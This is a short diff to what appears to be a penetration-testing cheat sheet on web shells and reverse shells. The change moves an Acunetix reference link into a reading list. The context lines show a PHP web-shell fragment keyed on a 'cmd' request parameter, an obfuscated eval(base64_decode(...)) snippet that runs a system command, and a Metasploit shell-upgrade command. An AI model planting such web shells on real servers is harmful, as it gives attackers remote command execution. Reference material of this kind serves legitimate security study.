@@ -41,7 +41,7 @@ if(isset($_REQUEST['cmd'])){
 ?>
 ```
 
-Decodes the Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code ((link)[https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/])
+Decodes the Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code:
 ```
 <?php
 eval(base64_decode("c3lzdGVtKCdscyAtbGEnKTsNCg=="));
@@ -124,3 +124,4 @@ use post/multi/manage/shell_to_meterpreter
 - [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [xl7dev](http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/)
 - [Shell upgrading](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+- [Web Shells Introduction](https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/)
